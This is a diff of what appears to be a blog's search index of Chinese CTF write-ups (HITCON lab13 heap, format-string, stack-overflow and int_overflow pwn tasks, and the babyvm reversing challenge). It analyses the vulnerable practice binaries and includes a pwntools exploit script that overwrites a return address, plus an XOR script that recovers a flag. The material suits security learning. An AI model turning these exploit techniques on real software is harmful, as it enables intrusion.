@@ -5,11 +5,15 @@
     <entry>
       <title><![CDATA[HITCON Trainging lab13]]></title>
       <url>/2020/04/16/HITCON-Trainging-lab13/</url>
-      <content type="html"><![CDATA[<p>chunk-extend学习，一个友好的题目，<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13" target="_blank" rel="noopener">下载地址</a></p>
+      <content type="html"><![CDATA[<h2 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h2><p>chunk-extend学习，一个友好的题目，<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13" target="_blank" rel="noopener">下载地址</a></p>
 <h3 id="0x00-程序分析"><a href="#0x00-程序分析" class="headerlink" title="0x00 程序分析"></a>0x00 程序分析</h3><p>基本信息</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/pwn/heapcreator&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
 <p>64位elf，开启了Canary和NX保护</p>
 <p>分析main函数</p>
+<figure class="image-box">
+                <img src="https://wx2.sbimg.cn/2020/04/20/1586611734293.md.png" alt="1" title class>
+                <p>1</p>
+            </figure>
 <p>大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针</p>
 <ol>
 <li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li>
@@ -19,13 +23,13 @@
 </ol>
 <h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>函数edit_heap()</p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1586612923039.png" alt="1586612923039" title class>
+                <img src="https://wx2.sbimg.cn/2020/04/20/1586612923039.md.png" alt="1586612923039" title class>
                 <p>1586612923039</p>
             </figure>
 <p>heaparray[v1]中存放的是chunk的size,(*heaparray[v1]+1)其实就是heaparray[v1+1]中存放的是堆的指针。</p>
 <p>分析create_heap()</p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1586613176346.png" alt="1586613176346" title class>
+                <img src="https://wx2.sbimg.cn/2020/04/20/1586613176346.png" alt="1586613176346" title class>
                 <p>1586613176346</p>
             </figure>
 <p>heaparray就在堆上,可以直接改heaparray上的指针。</p>
@@ -59,23 +63,23 @@
     <entry>
       <title><![CDATA[攻防世界,string]]></title>
       <url>/2020/04/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string/</url>
-      <content type="html"><![CDATA[<h3 id="0x00-函数分析"><a href="#0x00-函数分析" class="headerlink" title="0x00  函数分析"></a>0x00  函数分析</h3><p>基本信息</p>
+      <content type="html"><![CDATA[<h2 id="攻防世界-新手区-string"><a href="#攻防世界-新手区-string" class="headerlink" title="攻防世界 新手区  string"></a>攻防世界 新手区  string</h2><h3 id="0x00-函数分析"><a href="#0x00-函数分析" class="headerlink" title="0x00  函数分析"></a>0x00  函数分析</h3><p>基本信息</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/string&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
 <p>64位，开启了Canary和NX保护， RELRO。</p>
 <p>载入IDA,分析逻辑，进入函数sub_400D72(),有三个函数， sub_400A7D();<br>sub_400BB9(); sub_400CA6((_DWORD *)a1);</p>
 <p>函数sub_400BB9();</p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585958469569.png" alt="1585958469569" title class>
+                <img src="https://wx2.sbimg.cn/2020/04/20/1585958469569.md.png" alt="1585958469569" title class>
                 <p>1585958469569</p>
             </figure>
 <p>存在格式化字符串漏洞，可以进行任意地址写。</p>
 <p> 函数sub_400CA6((_DWORD *)a1)</p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585958551908.png" alt="1585958551908" title class>
+                <img src="https://wx1.sbimg.cn/2020/04/20/1585958551908.md.png" alt="1585958551908" title class>
                 <p>1585958551908</p>
             </figure>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585958656637.png" alt="1585958656637" title class>
+                <img src="https://wx1.sbimg.cn/2020/04/20/1585958656637.md.png" alt="1585958656637" title class>
                 <p>1585958656637</p>
             </figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</span><br></pre></td></tr></table></figure>
@@ -85,7 +89,7 @@
 <p>即要令<em>a1 == a1[1]，则需要</em>v3 == v3[1]。需要修改v3[0]为85</p>
 <p>而v3[0]的地址则在，main函数内可得到</p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585959372877.png" alt="1585959372877" title class>
+                <img src="https://wx1.sbimg.cn/2020/04/20/1585959372877.md.png" alt="1585959372877" title class>
                 <p>1585959372877</p>
             </figure>
 <h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>根据程序流程执行输入，函数sub_400A7D()中注意输入east即可跳出;进入函数sub_400BB9()。</p>
@@ -115,17 +119,17 @@
     <entry>
       <title><![CDATA[攻防世界,pwn200]]></title>
       <url>/2020/04/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn200/</url>
-      <content type="html"><![CDATA[<h3 id="0x00-函数分析"><a href="#0x00-函数分析" class="headerlink" title="0x00 函数分析"></a>0x00 函数分析</h3><p>基本信息</p>
+      <content type="html"><![CDATA[<h2 id="攻防世界-新手区-pwn-200"><a href="#攻防世界-新手区-pwn-200" class="headerlink" title="攻防世界 新手区 pwn-200"></a>攻防世界 新手区 pwn-200</h2><h3 id="0x00-函数分析"><a href="#0x00-函数分析" class="headerlink" title="0x00 函数分析"></a>0x00 函数分析</h3><p>基本信息</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/pwn/pwn-200&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
 <p>32位，开启了NX保护</p>
 <p>载入IDA，反汇编看主函数</p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585978770147.png" alt="1585978770147" title class>
+                <img src="https://wx2.sbimg.cn/2020/04/20/1585978770147.png" alt="1585978770147" title class>
                 <p>1585978770147</p>
             </figure>
 <p>函数sub_8048484()</p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585978830995.png" alt="1585978830995" title class>
+                <img src="https://wx2.sbimg.cn/2020/04/20/1585978830995.png" alt="1585978830995" title class>
                 <p>1585978830995</p>
             </figure>
 <h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>主要思路如下：</p>
@@ -166,12 +170,12 @@
 <p>载入IDA</p>
 <p>main函数</p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585968083816.png" alt="1585968083816" title class>
+                <img src="https://wx2.sbimg.cn/2020/04/20/1585968083816.png" alt="1585968083816" title class>
                 <p>1585968083816</p>
             </figure>
 <p><em>vulnerable_function</em>函数</p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585968097663.png" alt="1585968097663" title class>
+                <img src="https://wx1.sbimg.cn/2020/04/20/1585968097663.png" alt="1585968097663" title class>
                 <p>1585968097663</p>
             </figure>
 <p>程序代码很少，在read()存在栈溢出</p>
@@ -207,35 +211,31 @@
     <entry>
       <title><![CDATA[攻防世界,int_overflow]]></title>
       <url>/2020/04/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int-overflow/</url>
-      <content type="html"><![CDATA[<p>攻防世界 新手区  整数溢出</p>
-<p>0x00 函数分析</p>
-<p>基本信息</p>
+      <content type="html"><![CDATA[<h2 id="攻防世界-新手区-整数溢出"><a href="#攻防世界-新手区-整数溢出" class="headerlink" title="攻防世界 新手区  整数溢出"></a>攻防世界 新手区  整数溢出</h2><h3 id="0x00-函数分析"><a href="#0x00-函数分析" class="headerlink" title="0x00 函数分析"></a>0x00 函数分析</h3><p>基本信息</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/int_overflow&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
 <p>32位，开启NX保护</p>
 <p>载入IDA，诶，看到了一个</p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585964727164.png" alt="1585964727164" title class>
+                <img src="https://wx1.sbimg.cn/2020/04/20/1585964727164.png" alt="1585964727164" title class>
                 <p>1585964727164</p>
             </figure>
 <p>看来不用自己去构造了，看看怎么调用就可以了。</p>
 <p>继续分析，发现了重要得函数check_passwd，进入</p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585964928961.png" alt="1585964928961" title class>
+                <img src="https://wx1.sbimg.cn/2020/04/20/1585964928961.png" alt="1585964928961" title class>
                 <p>1585964928961</p>
             </figure>
 <p>条件满足v3&gt;3u且v3&lt;8u时，可以进入下面的else中，在strcpy处有存在溢出</p>
-<p>0x01 漏洞利用</p>
-<p>想要利用else中得strcpy，需要控制passwd得长度，第一种方法是passwd长度&gt;3 &amp;&amp; &lt;=8，第二种是是利用整数溢出。</p>
+<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>想要利用else中得strcpy，需要控制passwd得长度，第一种方法是passwd长度&gt;3 &amp;&amp; &lt;=8，第二种是是利用整数溢出。</p>
 <p>而在限制passwd长度，即v3时，汇编代码中为s</p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585966010822.png" alt="1585966010822" title class>
+                <img src="https://wx2.sbimg.cn/2020/04/20/1585966010822.png" alt="1585966010822" title class>
                 <p>1585966010822</p>
             </figure>
 <p>在检测s的长度之后，可以看到程序把s放到一个al寄存器中，al是一个八位寄存器，八位寄存器对于无符号整数来说范围是有0~255，所以利用整数溢出，则passwd得长度应为259~264。</p>
 <p>第一种passwd太短，无法利用进行改写程序流，所以使用第二种思路。</p>
 <p>程序中存在，可以将返回地址指向what_is_this()</p>
-<p>0x02 exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./int_overflow'</span>)</span><br><span class="line">sys_addr=<span class="number">0x0804868B</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input your username:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaa"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input your passwd:\n"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span>+p32(sys_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">260</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./int_overflow'</span>)</span><br><span class="line">sys_addr=<span class="number">0x0804868B</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input your username:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaa"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Please input your passwd:\n"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span>+p32(sys_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">260</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 ]]></content>
       
         <categories>
@@ -258,59 +258,59 @@
     <entry>
       <title><![CDATA[babyvm]]></title>
       <url>/2020/01/16/babyvm/</url>
-      <content type="html"><![CDATA[<h1 id="0x0-函数分析"><a href="#0x0-函数分析" class="headerlink" title="0x0  函数分析"></a>0x0  函数分析</h1><p>载入IDA，F5查看主函数</p>
+      <content type="html"><![CDATA[<h2 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h2><h3 id="0x0-函数分析"><a href="#0x0-函数分析" class="headerlink" title="0x0  函数分析"></a>0x0  函数分析</h3><p>载入IDA，F5查看主函数</p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579175642703.png" alt="1579175642703" title class>
+                <img src="https://wx1.sbimg.cn/2020/04/20/1579175580774.png" alt="1579175642703" title class>
                 <p>1579175642703</p>
             </figure>
 <p>有三个函数，进一步查看</p>
 <p><strong>sub_400839</strong></p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579176105200.png" alt="1579176105200" title class>
+                <img src="https://wx2.sbimg.cn/2020/04/20/1579176105200.png" alt="1579176105200" title class>
                 <p>1579176105200</p>
             </figure>
 <p>此函数为VM的初始化过程，6010A0为vm操作码的内容，0xf1代表sub_400738函数，0xf2代表sub_4006B6函数，0xf5代表sub_4006F4函数</p>
 <p><strong>unk_6010A0内容（截取部分）</strong></p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579177072366.png" alt="1579177072366" title class>
+                <img src="https://wx2.sbimg.cn/2020/04/20/1579177072366.png" alt="1579177072366" title class>
                 <p>1579177072366</p>
             </figure>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579177089451.png" alt="1579177089451" title class>
+                <img src="https://wx2.sbimg.cn/2020/04/20/1579177089451.png" alt="1579177089451" title class>
                 <p>1579177089451</p>
             </figure>
 <p><strong>sub_400738（0xf1）</strong></p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579177178288.png" alt="1579177178288" title class>
+                <img src="https://wx1.sbimg.cn/2020/04/20/1579177178288.png" alt="1579177178288" title class>
                 <p>1579177178288</p>
             </figure>
 <p>分析可知0xF1代表的是MOV指令，操作数0xE1,0xE2,0xE3,0xE4各自代表不同的寄存器赋值。其中0xE4表示将寄存器赋值给栈s中。</p>
 <p><strong>sub_4006B6  (0xf2)</strong></p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579178347263.png" alt="1579178347263" title class>
+                <img src="https://wx1.sbimg.cn/2020/04/20/1579178347263.png" alt="1579178347263" title class>
                 <p>1579178347263</p>
             </figure>
 <p>0xf2代表异或， xor，与0x34异或。</p>
 <p>其中a1^=a1[1]^0x34,中a[1]的值为0</p>
 <p><strong>sub_4006F4   (0xf5)</strong></p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579179967857.png" alt="1579179967857" title class>
+                <img src="https://wx2.sbimg.cn/2020/04/20/1579179967857.png" alt="1579179967857" title class>
                 <p>1579179967857</p>
             </figure>
 <p>0xf5为read()函数</p>
 <p><strong>sub_40094e</strong></p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579176746772.png" alt="1579176746772" title class>
+                <img src="https://wx2.sbimg.cn/2020/04/20/1579176746772.png" alt="1579176746772" title class>
                 <p>1579176746772</p>
             </figure>
 <p>该函数是对6010A0操作码内容的执行，一直到0xf4结束</p>
 <p><strong>sub_400986</strong></p>
 <figure class="image-box">
-                <img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1579176715766.png" alt="1579176715766" title class>
+                <img src="https://wx2.sbimg.cn/2020/04/20/1579176715766.png" alt="1579176715766" title class>
                 <p>1579176715766</p>
             </figure>
 <p>非常明显，这是一个check函数，异或加密后输入内容，与byte_601080的内容进行对比。这里注意的是，我们输入的内容在经过异或加密后存储地址变更为s[0x20]~s[0x2c]。</p>
-<h1 id="0x1-虚拟化指令分析"><a href="#0x1-虚拟化指令分析" class="headerlink" title="0x1 虚拟化指令分析"></a>0x1 虚拟化指令分析</h1><p><strong>unk_6010A0内容</strong></p>
+<h3 id="0x1-虚拟化指令分析"><a href="#0x1-虚拟化指令分析" class="headerlink" title="0x1 虚拟化指令分析"></a>0x1 虚拟化指令分析</h3><p><strong>unk_6010A0内容</strong></p>
 <p>0xf5,                                                     </p>
 <p>0xf1,0xe1,0x0,0x0,0x0,0x0,             </p>
 <p>0xf2,   </p>
@@ -394,7 +394,7 @@
 <p>r1 ^= 0x34</p>
 <p>s[0x2c] = r1</p>
 <p>ret</p>
-<h1 id="0x2-解密"><a href="#0x2-解密" class="headerlink" title="0x2  解密"></a>0x2  解密</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s=[<span class="string">'\x75'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x51'</span>,<span class="string">'\x00'</span>,<span class="string">'\x47'</span>,<span class="string">'\x6d'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x42'</span>,<span class="string">'\x59'</span>,<span class="string">'\x15'</span>,<span class="string">'\x15'</span>,<span class="string">'\x15'</span>,]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">l=len(s)</span><br><span class="line"></span><br><span class="line">s=list(map(ord,s))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line"></span><br><span class="line">​    num=s[i]^<span class="number">0x34</span></span><br><span class="line"></span><br><span class="line">​    flag+=chr(num)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">flag：A_e4sY_vm!!!</span><br></pre></td></tr></table></figure>
+<h3 id="0x2-解密"><a href="#0x2-解密" class="headerlink" title="0x2  解密"></a>0x2  解密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s=[<span class="string">'\x75'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x51'</span>,<span class="string">'\x00'</span>,<span class="string">'\x47'</span>,<span class="string">'\x6d'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x42'</span>,<span class="string">'\x59'</span>,<span class="string">'\x15'</span>,<span class="string">'\x15'</span>,<span class="string">'\x15'</span>,]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">l=len(s)</span><br><span class="line"></span><br><span class="line">s=list(map(ord,s))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line"></span><br><span class="line">​    num=s[i]^<span class="number">0x34</span></span><br><span class="line"></span><br><span class="line">​    flag+=chr(num)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">flag：A_e4sY_vm!!!</span><br></pre></td></tr></table></figure>
 ]]></content>
       
         <categories>
